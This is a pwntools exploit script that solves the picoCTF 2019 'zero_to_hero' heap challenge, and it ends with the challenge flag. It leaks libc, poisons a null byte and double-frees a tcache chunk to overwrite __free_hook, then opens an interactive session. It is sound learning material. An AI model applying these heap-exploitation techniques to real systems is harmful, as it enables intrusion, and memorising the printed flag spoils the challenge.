#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./sice_cream '--host=2019shell1.picoctf.com' '--port=6552'
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./zero_to_hero')

if args.LIBC:
  libc_path = "./libc.so.6"
  os.environ['LD_PRELOAD'] = libc_path
else:
  libc_path = "./libc.so.6"
  #libc_path = "/lib/x86_64-linux-gnu/libc.so.6"

libc = ELF(libc_path)
#os.environ['LD_LIBRARY_PATH'] = '.'

host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 37921)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    """
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
    """
    r =  process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(r,  gdbscript=gdbscript, *a, **kw)
        #gdb.attach(r,  gdbscript=gdbscript)

    return r

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


def malloc_super(io, length, data):
    io.sendline("1")
    io.recvuntil(">")
    io.sendline(str(length))
    io.recvuntil(">")
    if length <= len(data):
        print("option1")
        io.send(data[:length])
    else:
        print("option2")
        io.sendline(data)
    io.recvuntil(">")

def free_super(io, idx):
    io.sendline("2")
    io.recvuntil(">")
    io.sendline(str(idx))
    io.recvuntil(">")
    

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#run with DEBUG LIBC so that you can see the flag being printed

io = start()
io.recvuntil("hero?")

io.send("y"+"C"*(0x14-1))
io.recvuntil("Take this: 0x")
addr = io.recvline()[:-1]
leak_system = int(addr, 16)
libc.address = leak_system - libc.symbols['system']
print "LEAK SYSTEM: %s" %hex(leak_system)
print "malloc_hook: %s" %hex(libc.symbols['__malloc_hook'])
print "LIBC BASE: ", hex(libc.address)
io.recvuntil(">")

"""
# Dealing with libc 2.29...
# gefâž¤  call (char*)gnu_get_libc_version()
# $3 = 0x7f15a601d325 "2.29"

 - Only have 7 Mallocs (unless we overwrite counter)
 - max size == 0x408 (1032bytes)

Vulnerability is that have a list of pointers, so we can hopefully create a fake chunk and then free it?
We can also write a null to the size of the next chunk, (null poison)

problem is that anything we alloc needs to be in tcache space < 0x408

"""



payload = cyclic(0x408)
#payload = ""
malloc_super(io, 0x148, "" )

payload = ""
payload += "-"*(0x100-8)
payload += p64(0x51)
payload += "A"*(0x148-len(payload))
malloc_super(io, 0x148, payload )

free_super(io,1)
free_super(io,0)

payload = ""
payload += "A"*0x148
malloc_super(io, 0x148, payload )

free_super(io,1)

# Now have the same pointer on two tcache lists.
payload = ""
payload += p64(libc.symbols['__free_hook'])
malloc_super(io, 0x148, payload ) #get the pointer from the larger tcache list, should overwrite the chuck above?

malloc_super(io, 0xf0, "" ) #get the pointer from the smaller tcache list

#Next pointer should be __free_hook 
payload = p64(0x400a02)
malloc_super(io, 0xf0, payload ) #get the pointer from the smaller tcache list
free_super(io,2)
io.interactive()

#picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_uiavskvb}

